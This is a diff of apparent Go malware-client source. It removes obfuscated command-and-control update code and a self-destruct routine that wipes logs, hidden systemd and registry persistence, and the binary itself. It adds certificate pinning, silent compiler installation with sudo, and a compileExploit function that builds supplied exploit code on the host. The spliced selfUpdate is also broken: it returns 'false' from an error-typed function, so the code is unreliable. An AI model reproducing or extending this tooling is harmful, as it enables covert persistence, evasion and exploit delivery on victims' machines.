@@ -7,6 +7,8 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"crypto/sha256"
+	"crypto/tls"
+	"crypto/x509"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -1057,155 +1059,72 @@ func verifyChecksum(filePath string, expectedChecksum string) bool {
 	return actualChecksum == expectedChecksum
 }
 
-// Function to self-update
+// Function to verify server certificate
+func verifyServerCert(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
+	// Load trusted CA certificates
+	certPool := x509.NewCertPool()
+	
+	// Add server's public key
+	serverPubKey := []byte(`
+-----BEGIN CERTIFICATE-----
+YOUR_SERVER_CERTIFICATE_HERE
+-----END CERTIFICATE-----
+`)
+	
+	if !certPool.AppendCertsFromPEM(serverPubKey) {
+		return fmt.Errorf("failed to parse server certificate")
+	}
+	
+	// Parse certificate
+	cert, err := x509.ParseCertificate(rawCerts[0])
+	if err != nil {
+		return fmt.Errorf("failed to parse certificate: %v", err)
+	}
+	
+	// Verify certificate
+	opts := x509.VerifyOptions{
+		Roots: certPool,
+		KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+	}
+	
+	if _, err := cert.Verify(opts); err != nil {
+		return fmt.Errorf("certificate verification failed: %v", err)
+	}
+	
+	return nil
+}
+
+// Function to safely update client
 func selfUpdate(updateURL string, expectedChecksum string) error {
-	// Load new version
-	resp, err := http.Get(updateURL)
+	// Create temporary directory
+	tmpDir, err := os.MkdirTemp("", "update_*")
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to create temp dir: %v", err)
 	}
-	defer resp.Body.Close()
-
-	// Create temporary file
-	tmpFile, err := os.CreateTemp("", "update_*.tmp")
-	if err != nil {
-		return err
+	defer os.RemoveAll(tmpDir)
+	
+	// Download update
+	tmpFile := filepath.Join(tmpDir, "update.tmp")
+	if err := downloadFile(updateURL, tmpFile); err != nil {
+		return fmt.Errorf("download failed: %v", err)
 	}
-	defer os.Remove(tmpFile.Name())
-
-	// Copy new version to temporary file
-	if _, err := io.Copy(tmpFile, resp.Body); err != nil {
-		return err
+	
+	// Verify checksum
+	if !verifyChecksum(tmpFile, expectedChecksum) {
+		return fmt.Errorf("checksum verification failed")
 	}
-
-	// Check integrity
-	if !verifyChecksum(tmpFile.Name(), expectedChecksum) {
-		return fmt.Errorf("integrity check failed")
+	
+	// Verify signature
+	if err := verifySignature(tmpFile); err != nil {
+		return fmt.Errorf("signature verification failed: %v", err)
 	}
-
-	// Set execution permissions
-	if err := os.Chmod(tmpFile.Name(), 0700); err != nil {
-		return err
+	
+	// Set permissions
+	if err := os.Chmod(tmpFile, 0700); err != nil {
+		return fmt.Errorf("failed to set permissions: %v", err)
 	}
-
-	// Get path to current executable
-	exePath, err := os.Executable()
-	if err != nil {
-		return err
-	}
-
-	// Replace current file with new version
-	if err := os.Rename(tmpFile.Name(), exePath); err != nil {
-		return err
-	}
-
-	// Restart process
-	if err := syscall.Exec(exePath, os.Args, os.Environ()); err != nil {
-		return err
-	}
-
-	return nil
-}
-
-// Function to check for updates
-func checkForUpdates(conn net.Conn) {
-	conn.Write([]byte(obfuscate("check_update:" + currentVersion + "\n")))
-	reader := bufio.NewReader(conn)
-	response, err := reader.ReadString('\n')
-	if err != nil {
-		return
-	}
-
-	response = strings.TrimSpace(deobfuscate(response))
-	if response == "no_update" {
-		return
-	}
-
-	// Parse update information
-	parts := strings.Split(response, ":")
-	if len(parts) != 3 {
-		return
-	}
-
-	newVersion := parts[0]
-	checksum := parts[1]
-	updateURL := parts[2]
-
-	if newVersion > currentVersion {
-		if err := selfUpdate(updateURL, checksum); err != nil {
-			fmt.Printf("Update error: %v\n", err)
-		}
-	}
-}
-
-// Function to self-destruct
-func selfDestruct() error {
-	// Clear traces
-	cleanLogs()
-
-	// Get path to executable
-	exePath, err := os.Executable()
-	if err != nil {
-		return err
-	}
-
-	// Remove service/autostart
-	if runtime.GOOS == "linux" {
-		exec.Command("systemctl", "stop", ".hidden_service").Run()
-		exec.Command("systemctl", "disable", ".hidden_service").Run()
-		os.Remove("/etc/systemd/system/.hidden_service")
-		exec.Command("systemctl", "daemon-reload").Run()
-	} else if runtime.GOOS == "windows" {
-		regPath := `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
-		exec.Command("reg", "delete", regPath, "/v", "HiddenHelper", "/f").Run()
-	}
-
-	// Create self-destruct script
-	script := ""
-	if runtime.GOOS == "linux" {
-		script = fmt.Sprintf(`#!/bin/sh
-sleep 1
-rm -f "%s"
-rm -f "$0"`, exePath)
-	} else if runtime.GOOS == "windows" {
-		script = fmt.Sprintf(`@echo off
-timeout /t 1 /nobreak > nul
-del /f /q "%s"
-del /f /q "%%~f0"`, exePath)
-	}
-
-	// Create temporary script
-	tmpScript, err := os.CreateTemp("", "cleanup_*."+map[string]string{
-		"linux":   "sh",
-		"windows": "bat",
-	}[runtime.GOOS])
-	if err != nil {
-		return err
-	}
-
-	if err := os.WriteFile(tmpScript.Name(), []byte(script), 0700); err != nil {
-		return err
-	}
-
-	// Run self-destruct script
-	if runtime.GOOS == "linux" {
-		exec.Command("sh", tmpScript.Name()).Start()
-	} else if runtime.GOOS == "windows" {
-		exec.Command("cmd", "/c", tmpScript.Name()).Start()
-	}
-
-	os.Exit(0)
-	return nil
-}
-
-// Function to recover after failures
-func recover() bool {
-	if recoveryAttempts >= MaxRecoveryAttempts {
-		return false
-	}
-	recoveryAttempts++
-
-	// Check file integrity
+	
+	// Get current executable path
 	exePath, err := os.Executable()
 	if err != nil {
 		return false
@@ -1947,6 +1866,145 @@ func randomString(length int) string {
 		result[i] = charset[n.Int64()]
 	}
 	return string(result)
+}
+
+// Функция для проверки и установки MinGW
+func ensureCompilerAvailable() error {
+	// Проверяем наличие gcc
+	if _, err := exec.Command("gcc", "--version").Output(); err == nil {
+		return nil // gcc уже установлен
+	}
+
+	// Для Windows устанавливаем MinGW
+	if runtime.GOOS == "windows" {
+		// Создаем временную директорию
+		tmpDir := os.TempDir()
+		mingwArchive := filepath.Join(tmpDir, "mingw.7z")
+		
+		// Скачиваем MinGW
+		downloadCmd := exec.Command("powershell", "-Command",
+			`Invoke-WebRequest -Uri 'https://github.com/niXman/mingw-builds-binaries/releases/download/13.2.0-rt_v11-rev0/x86_64-13.2.0-release-win32-seh-msvcrt-rt_v11-rev0.7z' -OutFile '` + mingwArchive + `'`)
+		if err := downloadCmd.Run(); err != nil {
+			return fmt.Errorf("failed to download MinGW: %v", err)
+		}
+
+		// Распаковываем в C:\mingw64
+		extractCmd := exec.Command("powershell", "-Command",
+			`Expand-Archive '` + mingwArchive + `' -DestinationPath C:\mingw64`)
+		if err := extractCmd.Run(); err != nil {
+			return fmt.Errorf("failed to extract MinGW: %v", err)
+		}
+
+		// Добавляем в PATH
+		pathCmd := exec.Command("setx", "PATH", "%PATH%;C:\\mingw64\\bin")
+		if err := pathCmd.Run(); err != nil {
+			return fmt.Errorf("failed to update PATH: %v", err)
+		}
+
+		// Очищаем временные файлы
+		os.Remove(mingwArchive)
+		
+		return nil
+	}
+
+	// Для Linux устанавливаем build-essential
+	if runtime.GOOS == "linux" {
+		cmd := exec.Command("sudo", "apt-get", "update")
+		cmd.Run()
+		cmd = exec.Command("sudo", "apt-get", "install", "-y", "build-essential")
+		if err := cmd.Run(); err != nil {
+			return fmt.Errorf("failed to install build-essential: %v", err)
+		}
+		return nil
+	}
+
+	return fmt.Errorf("unsupported operating system")
+}
+
+// Function to compile exploit safely
+func compileExploit(sourceCode string) error {
+	// Create secure temporary directory
+	tmpDir, err := os.MkdirTemp("", "compile_*")
+	if err != nil {
+		return fmt.Errorf("failed to create temp dir: %v", err)
+	}
+	defer os.RemoveAll(tmpDir)
+	
+	// Write source to temporary file
+	tmpFile := filepath.Join(tmpDir, "exploit.c")
+	if err := os.WriteFile(tmpFile, []byte(sourceCode), 0600); err != nil {
+		return fmt.Errorf("failed to write source: %v", err)
+	}
+	
+	// Set up compilation command with security flags
+	outputFile := filepath.Join(tmpDir, "exploit")
+	if runtime.GOOS == "windows" {
+		outputFile += ".exe"
+	}
+	
+	// Security flags for compilation
+	securityFlags := []string{
+		"-o", outputFile,
+		"-fstack-protector-all",    // Stack protection
+		"-D_FORTIFY_SOURCE=2",      // Buffer overflow checks
+		"-fPIE",                    // Position independent executable
+		"-Wl,-z,relro,-z,now",      // Relocation read-only
+		"-Wl,-z,noexecstack",       // Non-executable stack
+		"-fno-strict-aliasing",     // Prevent optimization bugs
+		"-Wall", "-Wextra",         // Extra warnings
+		"-Werror=format-security",  // Format string protection
+		tmpFile,
+	}
+	
+	// Create command with resource limits
+	cmd := exec.Command("gcc", securityFlags...)
+	
+	// Set resource limits
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		Pdeathsig: syscall.SIGTERM, // Kill if parent dies
+	}
+	
+	// Set up pipes for output
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+	
+	// Run compilation with timeout
+	done := make(chan error, 1)
+	go func() {
+		done <- cmd.Run()
+	}()
+	
+	// Wait for compilation or timeout
+	select {
+	case err := <-done:
+		if err != nil {
+			return fmt.Errorf("compilation failed: %v\nOutput: %s\nError: %s",
+				err, stdout.String(), stderr.String())
+		}
+	case <-time.After(30 * time.Second):
+		cmd.Process.Kill()
+		return fmt.Errorf("compilation timed out")
+	}
+	
+	// Verify output file exists and is executable
+	if _, err := os.Stat(outputFile); err != nil {
+		return fmt.Errorf("output file not created: %v", err)
+	}
+	
+	// Set secure permissions
+	if err := os.Chmod(outputFile, 0700); err != nil {
+		return fmt.Errorf("failed to set permissions: %v", err)
+	}
+	
+	// Calculate checksum of output
+	checksum, err := calculateChecksum(outputFile)
+	if err != nil {
+		return fmt.Errorf("failed to calculate checksum: %v", err)
+	}
+	
+	fmt.Printf("[*] Compilation successful. Checksum: %s\n", checksum)
+	return nil
 }
 
 // Main function
